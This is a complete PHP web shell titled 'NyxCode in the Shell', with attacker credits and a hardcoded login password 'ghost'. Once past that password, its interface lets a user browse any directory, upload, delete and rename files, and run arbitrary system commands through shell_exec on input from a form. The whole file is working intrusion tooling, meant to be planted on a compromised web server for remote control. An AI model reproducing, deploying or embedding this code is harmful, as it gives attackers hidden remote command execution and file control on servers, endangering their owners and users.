<?php
/*
  _   _         _____          _      
    | \ | |       / ____|        | |     
    |  \| |_   _ | |     ___   __| | ___ 
    | . ` | | | || |    / _ \ / _` |/ _ \
    | |\  | |_| || |___| (_) | (_| |  __/
    |_| \_|\__, (_)_____\___/ \__,_|\___|
            __/ |                        
           |___/       ft. 0x6ick
*/

error_reporting(0);
session_start();

if(!isset($_SESSION['gits_login'])) {
  if(isset($_POST['pass']) && $_POST['pass'] == 'ghost') {
    $_SESSION['gits_login'] = true;
  } else {
    echo '<form method="POST"><input type="password" name="pass" placeholder="Enter Password"><input type="submit" value="Login"></form>';
    exit;
  }
}

$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
chdir($path);
$path = getcwd();
$files = scandir($path);

function perms($file) {
  return substr(sprintf('%o', fileperms($file)), -4);
}

echo "<style>
  body { background-color: black; color: aqua; font-family: monospace; }
  a { color: white; text-decoration: none; }
  table { width: 100%; border-collapse: collapse; }
  th, td { border: 1px solid aqua; padding: 5px; }
  input, submit { background: #222; color: aqua; border: 1px solid aqua; padding: 5px; }
</style>";

echo "<h2>NyxCode in the Shell</h2>";
echo "<p>©NyX6st</p>";
echo "<p>Path: $path</p>";

echo '<table>'; 
echo '<tr><th>Name</th><th>Size</th><th>Permissions</th><th>Actions</th></tr>';

foreach($files as $file) {
  $link = "?path=$path&file=".urlencode($file);
  echo '<tr><td>'.
    (is_dir($file) ? "<a href='?path=$path/$file'>$file</a>" : $file).
    '</td><td>'.
    (is_file($file) ? filesize($file) : '-').
    '</td><td>'.perms($file).'</td><td>'.
    (is_file($file) ? "<a href='$link&act=del'>Delete</a> | <a href='$link&act=rename'>Rename</a>" : '-')
    .'</td></tr>';
}
echo '</table>';

// Upload
if(isset($_FILES['up'])) {
  if(move_uploaded_file($_FILES['up']['tmp_name'], $_FILES['up']['name'])) {
    echo "<p>Upload Success!</p>";
  } else {
    echo "<p>Upload Failed!</p>";
  }
}
echo '<form method="POST" enctype="multipart/form-data">Upload: <input type="file" name="up"><input type="submit" value="Upload"></form>';

// Delete
if(isset($_GET['act']) && $_GET['act'] == 'del') {
  $f = $_GET['file'];
  if(is_file($f)) {
    unlink($f);
    echo "<p>Deleted $f</p>";
  }
}

// Rename
if(isset($_GET['act']) && $_GET['act'] == 'rename') {
  $f = $_GET['file'];
  echo '<form method="POST">Rename '.$f.' to <input type="text" name="newname"><input type="submit" name="ren" value="Rename"></form>';
  if(isset($_POST['ren'])) {
    rename($f, $_POST['newname']);
    echo "<p>Renamed!</p>";
  }
}

// Command Exec
if(isset($_POST['cmd'])) {
  echo '<pre>'.shell_exec($_POST['cmd']).'</pre>';
}
echo '<form method="POST">CMD: <input type="text" name="cmd"><input type="submit" value="Execute"></form>';
